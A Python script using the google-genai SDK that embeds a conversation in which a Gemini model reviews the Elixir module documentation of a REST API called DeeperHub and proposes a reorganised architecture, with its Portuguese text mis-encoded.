# To run this code you need to install the following dependencies:
# pip install google-genai

import base64
import os
from google import genai
from google.genai import types


def generate():
    client = genai.Client(
        api_key=os.environ.get("GEMINI_API_KEY"),
    )

    files = [
        # Please ensure that the file is available in local system working direrctory or change the file path.
        client.files.upload(file="modules_documentation.txt"),
    ]
    model = "gemini-2.5-pro-preview-05-06"
    contents = [
        types.Content(
            role="user",
            parts=[
                types.Part.from_uri(
                    file_uri=files[0].uri,
                    mime_type=files[0].mime_type,
                ),
                types.Part.from_text(text="""pedi para uma IA construir uma RestAPI em Elixir pra mim, este foi o resultado de tudo o que ela criou. Por favor quero que voc√™ imagine construirmos um novo sistema do zero com todas estas features e quero que al√©m de avaliar  e revisar todas as categorias, estruturas de pastas, nomes de m√≥dulos e integra√ß√£o dos m√≥dulos entre si, adicione tamb√©m para cada m√≥dulo as novas funcionalidades que achar necess√°rio para um sistema s√≥lido em produ√ß√£o com tudo integrado. Eu quero que dentro de Core voc√™ adicione todos os m√≥dulos que ser√£o necess√°rios para uma boa integra√ß√£o e completude do sistema e que outros m√≥dulos depender√£o deles para se integrar e funcionar.  Inicialmente avalie o material que tem deste arquivo texto, construa um resumo de um novo sistema e diga o que faria de diferente primeiro"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Here's a breakdown of the thinking process to generate the DeeperHub system analysis and README generation plan:

1.  **Understand the Core Request:** The user wants me to act as a system architect and documentation specialist. They've provided a large dump of Elixir module documentation for a system called \"DeeperHub\". The key tasks are:
    *   Analyze the existing modules.
    *   Propose a new system structure (if needed) with improvements.
    *   Identify core modules and their dependencies.
    *   Suggest new functionalities for a robust production system.
    *   Outline a plan to generate READMEs for each module.

2.  **Initial Skim and High-Level Categorization:**
    *   The `modules_documentation.txt` is extensive. I need to quickly identify major functional areas.
    *   Keywords like \"API\", \"Accounts\", \"Auth\", \"Audit\", \"BackgroundTasks\", \"Biometrics\", \"Console\", \"Core\", \"FeatureFlags\", \"LoginLocation\", \"MFA\", \"Mailer\", \"Metrics\", \"Notifications\", \"OAuth\", \"RBAC\", \"Recovery\", \"Security\", \"SessionPolicy\", \"Services\", \"Shared\", \"Tokens\", \"WebAuthn\", \"Webhooks\" stand out.
    *   \"Facade\" and \"Adapter\" patterns are prevalent, suggesting a layered architecture.
    *   \"Supervisor\" indicates OTP principles are being used.
    *   \"Schema\" implies Ecto and database interaction.
    *   \"Telemetry\" and \"Metrics\" point to observability.

3.  **Detailed Analysis - Module by Module (Mental or Scratchpad):**
    *   **API Group (`Elixir.DeeperHub.API.*`):**
        *   `RateLimit`: Facade, Registry, Supervisor, RateLimiter (Token Bucket). Seems like a good, isolated rate-limiting system.
        *   `Validation`: APIRequestValidator. Essential for input validation.
    *   **Accounts Group (`Elixir.DeeperHub.Accounts.*`):** This is a large one.
        *   `Accounts` (Facade): Central entry point. Good.
        *   `AccountManager`: Seems to be an older facade, potentially redundant given `DeeperHub.Accounts`. The `DelegationStructure` module confirms this refactoring.
        *   `FeatureFlags`: Specific to accounts, good separation.
        *   `Integrations.EventIntegration`: For publishing account-related events. Good.
        *   `Profile`, `Schema.*` (Profile, Session, User): Data models and related logic.
        *   `Services.*` (AuthService, EmailVerificationWorker, PasswordService, ProfileService, RegistrationService, SessionCleanupWorker, UserService): Specific business logic. This is a good breakdown.
        *   `Session`, `SessionManager`: Session management.
        *   `Supervisor`: OTP supervision.
        *   `TokenService`: For various token types (API, email, password reset, invitation).
        *   `User`: User schema/logic.
        *   `UserService`: (Duplicate of `Accounts.Services.UserService`?) - Need to check if this is a distinct entry point or a naming convention issue. The content looks very similar to the AccountManager's old responsibilities. The `DeeperHub.Accounts` facade likely calls this.
    *   **Application (`Elixir.DeeperHub.Application.*`):**
        *   `ApplicationFacade`, `ApplicationModule`: High-level application state/info.
    *   **Audit (`Elixir.DeeperHub.Audit.*`):** Comprehensive.
        *   Facade, Adapters, Behaviour, Event, Log, StatisticsCache, FeatureFlags, Integrations, Policies, Scheduler, Services, Supervisor, Telemetry, Workers. A very well-structured and complete auditing system.
    *   **Auth (`Elixir.DeeperHub.Auth.*`):** Another large one.
        *   Facade, Adapters (Auth, Authorization, Password, RateLimit, Session, Token), Behaviours, Integrations, PermissionService, RoleService, Schemas, Services, Supervisor, TemporaryPassword, Token, Validation, Workers. This seems to overlap significantly with `Accounts`. `Auth` might be the lower-level authentication/authorization mechanics, while `Accounts` is the higher-level user lifecycle management. The presence of `SessionAdapter` here and `SessionManager` in `Accounts` needs clarification or consolidation.
    *   **BackgroundTasks (`Elixir.DeeperHub.BackgroundTasks.*`):**
        *   Facades, Adapters, Behaviours, Cache, Integrations, Services, Supervisor, Telemetry. Well-structured background task system.
    *   **Biometrics (`Elixir.DeeperHub.Biometrics.*`):**
        *   Facade, Adapters, Behaviours, Cache, FeatureFlags, Integrations, Schemas, Services, Supervisor, Telemetry, Workers. Complete biometrics system.
    *   **Console (`Elixir.DeeperHub.Console.*`):**
        *   Facade, Adapters, Behaviours, Commands, Config, Integrations, Services, Supervisor, Telemetry. CLI interface.
    *   **Core (`Elixir.DeeperHub.Core.*`):**
        *   `AdapterBehaviour`: Base for adapters.
        *   `ApiResponder`: JSON response formatting.
        *   `ConfigManager`: Central configuration. Good.
        *   `Event`, `EventBus`, `EventSupervisor`: Pub/sub system. Good.
        *   `LoggerFacade`, `Services.InitialConfigStore`, `Services.LoggerFacade`: Logging infrastructure. The duplication of `LoggerFacade` needs to be addressed (likely alias).
        *   `MetricsFacade`: Metrics.
        *   `Notifications.*`: Notifications infrastructure.
    *   **Domain (`Elixir.DeeperHub.Domain.*`):**
        *   `FeatureFlags.*`: Domain-specific feature flags (Messaging, ServerReviews, Support, UserProfiles). Good.
        *   `Integrations.EventIntegration`: Domain event publishing.
    *   **FeatureFlags (`Elixir.DeeperHub.FeatureFlags.*`):** General feature flag system.
        *   Adapters, Behaviour, Cache, Extensions, Facade, Initializer, Integrations, Services, Supervisor, Telemetry, UnifiedFacade. Very comprehensive.
    *   **Infrastructure (`Elixir.DeeperHub.Infrastructure.*`):**
        *   `GeoIP`, `SMTP`: External service integrations with circuit breakers. Excellent.
    *   **Inspector (`Elixir.DeeperHub.Inspector.*`):** Code introspection tools. Useful for dev/docs.
    *   **Logger (`Elixir.DeeperHub.Logger.*`):** (Duplicate of `Core.LoggerFacade`?) - Looks like the actual logging implementation.
    *   **LoginLocation (`Elixir.DeeperHub.LoginLocation.*`):** Login location tracking. Good for security.
    *   **MFA (`Elixir.DeeperHub.MFA.*`):** Multi-factor authentication.
    *   **Mailer (`Elixir.DeeperHub.Mailer.*`):** Email sending.
    *   **ModuleInspector (`Elixir.DeeperHub.ModuleInspector.*`):** (Duplicate of `Inspector`?) Seems to be an older or simpler version.
    *   **Notifications (`Elixir.DeeperHub.Notifications.*`):** (Duplicate of `Core.NotificationsFacade`?) Looks like the actual notification implementation.
    *   **OAuth (`Elixir.DeeperHub.OAuth.*`):** OAuth integration.
    *   **RBAC (`Elixir.DeeperHub.RBAC.*`):** Role-Based Access Control.
    *   **Recovery (`Elixir.DeeperHub.Recovery.*`):** Account recovery.
    *   **Repo (`Elixir.DeeperHub.Repo`):** Main Ecto repo.
    *   **Security (`Elixir.DeeperHub.Security.*`):** Broad security features.
        *   Adapters, AdminAuth, BehavioralAnalysis, BruteForceProtection, CSRFProtection, Cache, Config, DataMasking, DdosProtection, Device, DeviceFingerprint, FeatureFlags, FraudDetection, GeoLocationService, Hashing, Integrations, IntrusionDetection, LogSanitizer, Monitoring, PathTraversalProtection, Plugs, Policy, ResponseSanitizer, RiskAssessment, SQLInjectionProtection, Supervisor, Telemetry, UnifiedSupervisor, Validation, XssProtection. Very extensive security module.
    *   **Services (`Elixir.DeeperHub.Services.*`):** Seems to be a dumping ground for various domain services.
        *   Achievements, Cache, Challenges, Lists, Rewards, Search, ServerAdvertisements, ServerAlerts, ServerEvents, ServerPackages, ServerReviews, ServerTags, ServerUpdateMessages, Servers, Shared, Social, Support, UserInteractions. This needs better organization, perhaps into distinct top-level domains.
    *   **SessionPolicy (`Elixir.DeeperHub.SessionPolicy.*`):** Session policy management.
    *   **Shared (`Elixir.DeeperHub.Shared.*`):** Utilities and shared components.
        *   Cache, CircuitBreaker, Database, Encryption, Formatters, Logging, Metrics, Notifications, RateLimiter, Supervisor, Utils, Validation. Good to have shared utilities. The `Notifications` here might be an older version or internal component.
    *   **TemporaryPassword (`Elixir.DeeperHub.TemporaryPassword.*`):** Temporary password management.
    *   **Tokens (`Elixir.DeeperHub.Tokens.*`):** Token management (JWT, API).
    *   **WebAuthn (`Elixir.DeeperHub.WebAuthn.*`):** WebAuthn implementation.
    *   **Webhooks (`Elixir.DeeperHub.Webhooks.*`):** Webhook system.

4.  **Identify Redundancies and Areas for Improvement:**
    *   **Module Naming/Organization:**
        *   `DeeperHub.Accounts.UserService` vs `DeeperHub.UserService` - Likely consolidation.
        *   `DeeperHub.Core.LoggerFacade` vs `DeeperHub.Logger` vs `DeeperHub.Shared.Logging.StructuredLogger`. The structure is a bit confusing. A single `DeeperHub.Logging` facade with internal services would be cleaner.
        *   `DeeperHub.Core.NotificationsFacade` vs `DeeperHub.Notifications` vs `DeeperHub.Shared.Notifications`. Similar to logging, needs consolidation.
        *   `DeeperHub.Inspector` vs `DeeperHub.ModuleInspector`. Consolidate.
        *   The `DeeperHub.Services.*` namespace is too broad. These should be top-level domains (e.g., `DeeperHub.Servers`, `DeeperHub.Achievements`, `DeeperHub.UserInteractions`).
    *   **Overlapping Functionality:**
        *   `Accounts` and `Auth` have significant overlap. `Auth` should ideally be the core engine, and `Accounts` the user-facing lifecycle management. The documentation needs to make this distinction clear or the modules need refactoring for clearer separation of concerns. For instance, `Auth.TokenService` and `Accounts.TokenService` need to be reconciled.
    *   **Facade/Adapter Usage:** Generally good, but ensure consistency. Unified facades (`*UnifiedFacade`) are interesting; they might represent an evolution or an attempt to simplify a complex underlying structure.

5.  **Propose a New System Structure (High-Level):**
    *   **Core Modules:** These are foundational and used by many others.
        *   `DeeperHub.Core.ConfigManager`
        *   `DeeperHub.Core.EventBus` (centralized from `Core.Event`)
        *   `DeeperHub.Core.Logger` (centralized logging facade)
        *   `DeeperHub.Core.Metrics` (centralized metrics facade)
        *   `DeeperHub.Core.Repo` (main Ecto Repo)
        *   `DeeperHub.Core.BackgroundTaskManager` (from `BackgroundTasks`)
        *   `DeeperHub.Core.CircuitBreaker` (from `Shared.CircuitBreaker`)
        *   `DeeperHub.Core.Cache` (from `Shared.Cache`)
        *   `DeeperHub.Core.Encryption` (from `Shared.Encryption`)
        *   `DeeperHub.Core.HTTPClient` (New, for abstracting HTTP calls, potentially with circuit breaker integration)
    *   **Application Modules (Domains):** These represent major business capabilities.
        *   `DeeperHub.Accounts` (User lifecycle, profiles)
        *   `DeeperHub.Auth` (Authentication engine, MFA, WebAuthn, OAuth, Tokens, SessionPolicy, Recovery, TemporaryPassword, SecurityQuestions) - *This is still very large. Further breakdown might be needed, or `Accounts` could absorb more of the user-facing aspects of these.*
        *   `DeeperHub.API` (Rate limiting, validation, response formatting)
        *   `DeeperHub.Audit`
        *   `DeeperHub.Notifications`
        *   `DeeperHub.Webhooks`
        *   `DeeperHub.FeatureFlags`
        *   `DeeperHub.RBAC`
        *   `DeeperHub.Security` (FraudDetection, IntrusionDetection, IPFirewall, CSRF, XSS, SQLi, PathTraversal, DataMasking, BehavioralAnalysis, LoginLocation, DeviceFingerprint) - *Also very large, potentially break down further e.g., `DeeperHub.ThreatDetection`, `DeeperHub.DataProtection`.*
        *   `DeeperHub.Servers` (managing game servers, etc.)
        *   `DeeperHub.UserInteractions` (Social features, reviews, messaging)
        *   `DeeperHub.Achievements`
        *   `DeeperHub.Rewards`
        *   `DeeperHub.Challenges`
        *   `DeeperHub.Support`
        *   `DeeperHub.Console`
        *   `DeeperHub.Biometrics`
        *   `DeeperHub.ModuleInspector` (dev tool)
    *   **Shared Utilities:**
        *   `DeeperHub.Shared.Utils` (Date, File, List, Map, Security, String, Validation)
        *   `DeeperHub.Shared.Schemas` (Common, base schemas if any)

6.  **Suggest New Functionalities:**
    *   **Core:**
        *   `HTTPClient`: Abstract HTTP calls, integrate with CircuitBreaker.
        *   `Internationalization (I18n)`: Central service for translations. (Noticed some in Notifications, should be core).
        *   `FeatureFlagging` strategy configuration (e.g., percentage rollouts, user segmentation beyond basic flags).
    *   **Accounts/Auth:**
        *   Passwordless login (Magic Links).
        *   Social Login integration beyond just OAuth (e.g., Apple Sign-In).
        *   Better clarity between `Accounts` and `Auth` responsibilities.
    *   **Security:**
        *   Content Moderation service.
        *   WAF integration points.
        *   Secrets Management integration.
    *   **UserInteractions/Social:**
        *   Friendships, Groups, Activity Feeds.
    *   **General:**
        *   Admin Panel/Dashboard (could leverage `Console` and `Metrics`).
        *   Data Archival/Purging strategies for more modules.
        *   More robust error handling and reporting (e.g., integration with Sentry).

7.  **Address the \"What I'd Do Differently\" Question:**
    *   **Consolidation:** Merge overlapping modules (Logging, Notifications, Auth/Accounts).
    *   **Domain-Driven Structure:** Elevate `DeeperHub.Services.*` into top-level domains.
    *   **Clearer Boundaries:** Define precise responsibilities for `Accounts` vs. `Auth`.
    *   **Core Services:** Identify and centralize more foundational services in `DeeperHub.Core`.
    *   **Documentation First:** Emphasize creating READMEs *as part of* module design, not just after.

8.  **Structure the Output:**
    *   Start with an overall assessment.
    *   Address the \"what I'd do differently\" question.
    *   Propose the new system structure with Core and Application modules.
    *   List suggested new functionalities.
    *   Provide the filled README template for one module as an example (choose a representative one like `Elixir.DeeperHub.Accounts`).
    *   Conclude with a statement about the process of generating READMEs for all modules.

9.  **Refine and Review:**
    *   Read through the generated text. Is it clear, concise, and comprehensive?
    *   Are there any contradictions?
    *   Does it directly answer all parts of the user's request?
    *   Is the tone appropriate (expert, helpful)?
    *   Check for formatting, especially with code blocks and lists.
    *   Ensure emojis are used appropriately as requested.

**(Self-correction during the process):**
*   Initially, I might just list modules. But the user asked for a *new system structure*. So, I need to group them logically.
*   The `Accounts` and `Auth` overlap is a major point. I need to highlight this and suggest a path forward.
*   The `Services` namespace is a clear anti-pattern for larger systems; breaking it down is crucial.
*   When suggesting new features, ensure they are relevant to a \"solid production system.\"
*   The README example should be detailed and follow the user's template accurately. Choosing `DeeperHub.Accounts` is good because it's central and complex.

By following these steps, the aim is to provide a thorough, actionable, and well-structured response that meets the user's request."""),
                types.Part.from_text(text="""Uau! Que material extenso e detalhado! Isso demonstra um sistema com uma arquitetura j√° bastante pensada e com uma grande separa√ß√£o de responsabilidades. √â um excelente ponto de partida.

Vamos analisar o que temos e como podemos organizar e aprimorar para um novo sistema DeeperHub.

## üöÄ Resumo Inicial e Avalia√ß√£o do Material Existente

O DeeperHub, pelo que vejo, √© um sistema complexo com funcionalidades robustas em diversas √°reas:

*   **Autentica√ß√£o e Autoriza√ß√£o:** M√∫ltiplos fatores (MFA), WebAuthn, OAuth, Tokens, RBAC, Pol√≠ticas de Sess√£o, Perguntas de Seguran√ßa.
*   **Gerenciamento de Contas:** Ciclo de vida completo de usu√°rios, perfis.
*   **Seguran√ßa:** Detec√ß√£o de Fraude, Prote√ß√£o contra For√ßa Bruta, CSRF, DDoS, Inje√ß√£o de SQL, XSS, Criptografia, An√°lise Comportamental, Localiza√ß√£o de Login, Saneamento de Logs e Respostas.
*   **Core/Infraestrutura:** Configura√ß√£o, Eventos, Logging, M√©tricas, Notifica√ß√µes, Cache, Circuit Breaker, Tarefas em Background.
*   **Funcionalidades de Dom√≠nio (em `Services`):** Servidores (com pacotes, alertas, eventos, reviews, tags, mensagens de atualiza√ß√£o), Conquistas, Desafios, Recompensas, Listas Gen√©ricas, Intera√ß√µes Sociais, Suporte.
*   **Ferramentas de Desenvolvimento:** Console, Inspetor de M√≥dulos.

**Pontos Positivos da Estrutura Atual:**

*   **Separa√ß√£o de Responsabilidades:** Muitos m√≥dulos t√™m um escopo bem definido.
*   **Padr√µes de Design:** Uso claro de Fachadas (Facades) e Adaptadores, o que √© √≥timo para desacoplamento.
*   **Seguran√ßa Abrangente:** Uma quantidade impressionante de m√≥dulos dedicados √† seguran√ßa.
*   **Observabilidade:** M√≥dulos de Telemetria e M√©tricas s√£o um bom sinal.
*   **OTP:** Presen√ßa de Supervisores indica uso de princ√≠pios OTP para resili√™ncia.

**O que eu faria de diferente / Pontos a Refinar (Primeiras Impress√µes):**

1.  **Estrutura de Pastas/Namespaces:**
    *   O namespace `Elixir.DeeperHub.Services.*` parece um pouco gen√©rico demais e agrupa muitos dom√≠nios de neg√≥cio distintos (Achievements, Servers, Support, etc.). Eu optaria por elevar cada um desses \"servi√ßos\" a um contexto de dom√≠nio de n√≠vel superior dentro de `Elixir.DeeperHub.*`. Por exemplo, `Elixir.DeeperHub.Servers`, `Elixir.DeeperHub.Achievements`.
    *   H√° uma sobreposi√ß√£o aparente e potencial confus√£o entre m√≥dulos como `DeeperHub.Core.LoggerFacade` e `DeeperHub.Logger`, ou `DeeperHub.Core.NotificationsFacade` e `DeeperHub.Notifications`. Uma estrutura mais clara e √∫nica para esses componentes centrais seria ben√©fica.
    *   O mesmo para `DeeperHub.Auth` e `DeeperHub.Accounts`. Parecem ter responsabilidades que se sobrep√µem significativamente. `Auth` poderia ser o motor de autentica√ß√£o/autoriza√ß√£o puro, e `Accounts` o gerenciador do ciclo de vida do usu√°rio que *utiliza* `Auth`.

2.  **Consolida√ß√£o de M√≥dulos Core:**
    *   Alguns m√≥dulos em `DeeperHub.Shared.*` (como Cache, CircuitBreaker, Encryption) s√£o t√£o fundamentais que poderiam ser parte de um `DeeperHub.Core.Infrastructure` ou similar, para deixar claro que s√£o blocos de constru√ß√£o transversais.
    *   Outros em `Shared` s√£o utilit√°rios (`Utils.*`) e podem permanecer assim, ou serem agrupados de forma mais granular se o `Shared` crescer demais.

3.  **Clarificar Fachadas \"Unificadas\":**
    *   A presen√ßa de fachadas como `OAuthFacadeUnified`, `BackgroundTasksFacadeUnified` sugere uma evolu√ß√£o ou tentativa de simplificar interfaces. √â importante garantir que a \"unifica√ß√£o\" realmente simplifique e n√£o adicione outra camada de indire√ß√£o desnecess√°ria. O objetivo de uma fachada √© simplificar, ent√£o se a fachada original j√° faz isso bem, a \"unificada\" pode ser redundante.

4.  **Documenta√ß√£o (Objetivo Principal):**
    *   A documenta√ß√£o fornecida j√° √© um bom come√ßo, com descri√ß√µes de m√≥dulos e fun√ß√µes. O objetivo agora √© padronizar isso no formato README proposto, detalhando *todas* as caracter√≠sticas, responsabilidades, APIs, configura√ß√µes, etc., para cada m√≥dulo.

## üèóÔ∏è Proposta de Nova Estrutura de M√≥dulos DeeperHub (Alto N√≠vel)

A ideia √© organizar os m√≥dulos em contextos de dom√≠nio claros e ter um `Core` robusto com componentes transversais bem definidos.

### üåü DeeperHub.Core (Componentes Transversais Fundamentais)

Estes s√£o os m√≥dulos que fornecem funcionalidades essenciais para todo o sistema. Outros m√≥dulos depender√£o deles.

1.  **`Core.ConfigManager`**:
    *   Respons√°vel: Gerenciamento centralizado de configura√ß√µes.
    *   Utilizado por: Praticamente todos os m√≥dulos para obter configura√ß√µes de runtime.
2.  **`Core.EventBus`**:
    *   Respons√°vel: Sistema de publica√ß√£o e assinatura de eventos (Pub/Sub).
    *   Utilizado por: M√≥dulos que emitem eventos (ex: `Accounts` em `user_created`) e m√≥dulos que escutam eventos (ex: `Notifications` para enviar email ap√≥s `user_created`).
3.  **`Core.Logger`**:
    *   Respons√°vel: Fachada para logging estruturado.
    *   Utilizado por: Todos os m√≥dulos para registrar informa√ß√µes, avisos, erros.
4.  **`Core.Metrics`**:
    *   Respons√°vel: Fachada para coleta e exposi√ß√£o de m√©tricas.
    *   Utilizado por: Todos os m√≥dulos para registrar m√©tricas de desempenho e sa√∫de.
5.  **`Core.Repo`**:
    *   Respons√°vel: Reposit√≥rio Ecto principal para intera√ß√£o com o banco de dados.
    *   Utilizado por: Todos os m√≥dulos que precisam persistir ou consultar dados.
6.  **`Core.BackgroundTaskManager`**:
    *   Respons√°vel: Gerenciamento e execu√ß√£o de tarefas em background.
    *   Utilizado por: M√≥dulos que precisam executar opera√ß√µes ass√≠ncronas (ex: `Mailer` para envio de emails em lote, `Audit` para processamento de logs).
7.  **`Core.CircuitBreakerFactory`**:
    *   Respons√°vel: Cria√ß√£o e gerenciamento de inst√¢ncias de Circuit Breakers para servi√ßos externos.
    *   Utilizado por: M√≥dulos que integram com APIs de terceiros (ex: `GeoIPService`, `SMTPService`).
8.  **`Core.Cache`**:
    *   Respons√°vel: Fachada para o sistema de cache (ETS, Redis, etc.).
    *   Utilizado por: M√≥dulos que precisam armazenar/recuperar dados frequentemente acessados para melhorar performance.
9.  **`Core.EncryptionService`**:
    *   Respons√°vel: Criptografia e descriptografia de dados sens√≠veis, gerenciamento de chaves.
    *   Utilizado por: M√≥dulos que lidam com dados sens√≠veis (ex: `Accounts` para senhas, `Security.DataMasking`).
10. **`Core.HTTPClient` (Novo Sugerido)**:
    *   Respons√°vel: Abstra√ß√£o para realizar chamadas HTTP externas, integrando-se opcionalmente com `CircuitBreakerFactory`.
    *   Utilizado por: Qualquer m√≥dulo que precise fazer chamadas HTTP (ex: `OAuth` para falar com provedores, `Webhooks` para enviar eventos).
11. **`Core.Internationalization (I18n)` (Novo Sugerido)**:
    *   Respons√°vel: Fornecer tradu√ß√µes e localiza√ß√£o para a aplica√ß√£o.
    *   Utilizado por: M√≥dulos que apresentam texto ao usu√°rio (`Notifications`, `API` para mensagens de erro, `Console`).
12. **`Core.APIResponder`**:
    *   Respons√°vel: Padroniza√ß√£o de respostas da API REST.
    *   Utilizado por: Todos os controllers da camada de API.
13. **`Core.InputValidator`**:
    *   Respons√°vel: Valida√ß√£o e sanitiza√ß√£o gen√©rica de entradas. (Pode absorver `Shared.Validation.InputValidator` e `Shared.Validation.InputSanitizer`).
    *   Utilizado por: M√≥dulos que recebem dados externos, especialmente a camada de API e Console.

### üì¶ M√≥dulos de Aplica√ß√£o/Dom√≠nio (Exemplos)

Estes m√≥dulos representam as funcionalidades de neg√≥cio do DeeperHub.

1.  **`DeeperHub.Accounts`**:
    *   Vis√£o Geral: Gerencia todo o ciclo de vida dos usu√°rios, seus perfis e dados associados.
    *   Funcionalidades Existentes: CRUD de usu√°rios, perfis, gerenciamento de sess√£o (via `Auth.SessionManager`).
    *   Novas Funcionalidades Sugeridas: Gerenciamento de prefer√™ncias de usu√°rio mais granular (al√©m de notifica√ß√µes), gest√£o de consentimento (LGPD/GDPR), hist√≥rico de atividades do usu√°rio (al√©m de auditoria, focado no usu√°rio).
2.  **`DeeperHub.Auth`**:
    *   Vis√£o Geral: Respons√°vel por todos os aspectos de autentica√ß√£o e autoriza√ß√£o.
    *   Funcionalidades Existentes: Login (senha, OAuth, WebAuthn), MFA, gerenciamento de tokens (JWT, API, recupera√ß√£o), pol√≠ticas de sess√£o, RBAC, perguntas de seguran√ßa.
    *   Novas Funcionalidades Sugeridas: Login com Magic Links, suporte a OpenID Connect, gerenciamento de escopos OAuth mais granular, integra√ß√£o com provedores de identidade externos (SAML).
3.  **`DeeperHub.API`**:
    *   Vis√£o Geral: Define e gerencia a API REST p√∫blica do DeeperHub.
    *   Funcionalidades Existentes: Rate Limiting, Valida√ß√£o de Requisi√ß√µes.
    *   Novas Funcionalidades Sugeridas: Versionamento de API, documenta√ß√£o de API interativa (Swagger/OpenAPI) gerada automaticamente, throttling mais avan√ßado (baseado em quotas de usu√°rio/plano).
4.  **`DeeperHub.Audit`**:
    *   Vis√£o Geral: Sistema completo de trilha de auditoria.
    *   Funcionalidades Existentes: Registro de eventos, pol√≠ticas de reten√ß√£o, detec√ß√£o de anomalias, relat√≥rios.
    *   Novas Funcionalidades Sugeridas: Integra√ß√£o com SIEM (Security Information and Event Management) externos, alertas configur√°veis para eventos de auditoria espec√≠ficos.
5.  **`DeeperHub.Notifications`**:
    *   Vis√£o Geral: Gerenciamento e envio de notifica√ß√µes multicanal.
    *   Funcionalidades Existentes: Envio por Email, In-App, Push; templates; prefer√™ncias de usu√°rio.
    *   Novas Funcionalidades Sugeridas: Suporte a SMS, notifica√ß√µes agregadas/digest, prioriza√ß√£o de notifica√ß√µes, log de entrega detalhado por canal.
6.  **`DeeperHub.Webhooks`**:
    *   Vis√£o Geral: Permite que sistemas externos sejam notificados sobre eventos no DeeperHub.
    *   Funcionalidades Existentes: Registro, disparo, monitoramento, assinatura de payloads.
    *   Novas Funcionalidades Sugeridas: Interface de gerenciamento para usu√°rios configurarem seus pr√≥prios webhooks, retentativas com backoff exponencial configur√°vel por webhook, log de hist√≥rico de entregas por webhook.
7.  **`DeeperHub.FeatureFlags`**:
    *   Vis√£o Geral: Gerenciamento de feature flags para lan√ßamento gradual e testes A/B.
    *   Funcionalidades Existentes: Habilita√ß√£o/desabilita√ß√£o, regras, cache, integra√ß√£o RBAC.
    *   Novas Funcionalidades Sugeridas: Segmenta√ß√£o de usu√°rios mais avan√ßada (porcentagem, atributos de usu√°rio), interface de gerenciamento de flags.
8.  **`DeeperHub.Security`**:
    *   Vis√£o Geral: Concentra as diversas camadas de prote√ß√£o do sistema.
    *   Funcionalidades Existentes: Detec√ß√£o de Fraude, Prote√ß√£o contra For√ßa Bruta, CSRF, DDoS, Inje√ß√£o de SQL, XSS, Criptografia (usando `Core.EncryptionService`), An√°lise Comportamental, Localiza√ß√£o de Login, Saneamento de Logs e Respostas, Gerenciamento de Dispositivos.
    *   Novas Funcionalidades Sugeridas: WAF (Web Application Firewall) plug√°vel, gerenciamento centralizado de pol√≠ticas de seguran√ßa (CSP, HSTS), scanner de vulnerabilidades integrado (ou hooks para integra√ß√£o).
9.  **`DeeperHub.Servers`** (Ex-`Services.Servers`):
    *   Vis√£o Geral: Gerenciamento de entidades \"Servidor\" e seus metadados.
    *   Funcionalidades Existentes: CRUD de servidores, pacotes, alertas, eventos, reviews, tags, mensagens de atualiza√ß√£o.
    *   Novas Funcionalidades Sugeridas: Monitoramento de status de servidor (integra√ß√£o com ping/query), estat√≠sticas de uso de servidor, sistema de modera√ß√£o para conte√∫do gerado pelo usu√°rio (reviews, tags).
10. **`DeeperHub.UserInteractions`** (Ex-`Services.UserInteractions`):
    *   Vis√£o Geral: Funcionalidades sociais e de intera√ß√£o entre usu√°rios.
    *   Funcionalidades Existentes: Favoritos, mensagens de chat, recomenda√ß√µes, feedback, den√∫ncias.
    *   Novas Funcionalidades Sugeridas: Sistema de amizades/seguidores, grupos de usu√°rios, feed de atividades.
11. **`DeeperHub.Gamification`** (Agrupando `Achievements`, `Rewards`, `Challenges`):
    *   Vis√£o Geral: Elementos de gamifica√ß√£o da plataforma.
    *   Funcionalidades Existentes: Gerenciamento de conquistas, recompensas, desafios.
    *   Novas Funcionalidades Sugeridas: Leaderboards, sistema de pontos/moedas virtuais.
12. **`DeeperHub.Support`** (Ex-`Services.Support`):
    *   Vis√£o Geral: Sistema de suporte ao cliente/usu√°rio.
    *   Funcionalidades Existentes: Cria√ß√£o e gerenciamento de tickets de suporte.
    *   Novas Funcionalidades Sugeridas: Base de conhecimento (FAQ), integra√ß√£o com chat de suporte ao vivo.
13. **`DeeperHub.Console`**:
    *   Vis√£o Geral: Interface de linha de comando para administra√ß√£o.
    *   Funcionalidades Existentes: Execu√ß√£o de comandos, ajuda, listagem.
    *   Novas Funcionalidades Sugeridas: Scripting de tarefas administrativas, hist√≥rico de comandos persistente.
14. **`DeeperHub.Biometrics`**:
    *   Vis√£o Geral: Autentica√ß√£o e an√°lise comportamental baseada em biometria.
    *   Funcionalidades Existentes: Captura, an√°lise, verifica√ß√£o, detec√ß√£o de anomalias.
    *   Novas Funcionalidades Sugeridas: Suporte a mais tipos de dados biom√©tricos, pol√≠ticas de consentimento para coleta de dados biom√©tricos.
15. **`DeeperHub.ModuleInspector`**:
    *   Vis√£o Geral: Ferramenta de desenvolvimento para inspecionar a estrutura do c√≥digo.
    *   Funcionalidades Existentes: Inspe√ß√£o de m√≥dulos, fun√ß√µes, typespecs.
    *   Novas Funcionalidades Sugeridas: Gera√ß√£o de diagramas de depend√™ncia, an√°lise de cobertura de documenta√ß√£o.
16. **`DeeperHub.GeoIP`** (Ex-`Infrastructure.GeoIP`):
    *   Vis√£o Geral: Servi√ßo de geolocaliza√ß√£o de IPs.
    *   Funcionalidades Existentes: Lookup de IP com Circuit Breaker.
    *   Novas Funcionalidades Sugeridas: Atualiza√ß√£o autom√°tica de base de dados GeoIP local (se usada como fallback).
17. **`DeeperHub.Mailer`** (Ex-`Infrastructure.SMTP` e `Mailer`):
    *   Vis√£o Geral: Servi√ßo de envio de emails.
    *   Funcionalidades Existentes: Envio de email com Circuit Breaker.
    *   Novas Funcionalidades Sugeridas: Suporte a m√∫ltiplos provedores SMTP, templates de email (se n√£o cobertos por `Notifications`).

### üõ†Ô∏è Utilit√°rios Compartilhados

*   **`DeeperHub.Shared.Utils`**: `DateUtils`, `FileUtils`, `ListUtils`, `MapUtils`, `SecurityUtils`, `StringUtils`, `ValidationUtils`.

## üìù Exemplo de README para um M√≥dulo (DeeperHub.Accounts)

Com base na sua estrutura e no material fornecido, vamos preencher o template para o m√≥dulo `Elixir.DeeperHub.Accounts`.

---

# M√≥dulo: `Elixir.DeeperHub.Accounts` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `Elixir.DeeperHub.Accounts`

O m√≥dulo `DeeperHub.Accounts` √© a fachada principal e ponto de entrada para todas as opera√ß√µes relacionadas ao gerenciamento do ciclo de vida de contas de usu√°rio e seus perfis associados no sistema DeeperHub. Ele orquestra funcionalidades como registro, autentica√ß√£o (delegando para `DeeperHub.Auth`), gerenciamento de perfis, e outras opera√ß√µes pertinentes √† conta do usu√°rio. üòä

